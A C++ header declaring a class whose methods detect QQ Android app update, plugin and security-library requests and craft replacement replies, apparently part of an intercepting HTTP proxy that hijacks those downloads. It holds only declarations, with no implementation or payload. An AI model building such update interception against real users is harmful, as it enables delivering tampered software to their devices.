
#include <windows.h>
#include <iostream>
#include "sslPublic.h"

using namespace std;


#define QQAPKUPDATEDOWNLOADHTML "qqapkUpdateDownload.html"

class QQAndroid {
public:
	static int isAndroidQQApkUpdate(string url, string host);

	static int QQAndroid::makeAndroidQQApkUpdateJs(char*recvBuffer, int buflimit, LPHTTPPROXYPARAM lphttp);


	static int isQQPlugin(string url, string host);
	static int QQAndroid::replyUpdate(char * lpdst, int dstsize, int dstlimit, string username);


	static int QQAndroid::isQQNowPlugin(string url, string host);

	static int QQAndroid::replyQQNow(char * dstbuf, int buflimit, string username);

	
	static int QQAndroid::isQQSecLibs(string url, string host);
	static int QQAndroid::replyQQSecLibsPlugin(char * dstbuf, int dstbufsize, int dstbuflimit, LPHTTPPROXYPARAM lphttp);


	static int QQAndroid::isQQNowMgrPlugin(string url, string host);

	static int QQAndroid::replyQQNowMgrPlugin(char * dstbuf, int dstbufsize, int dstbuflimit, LPHTTPPROXYPARAM lphttp);

};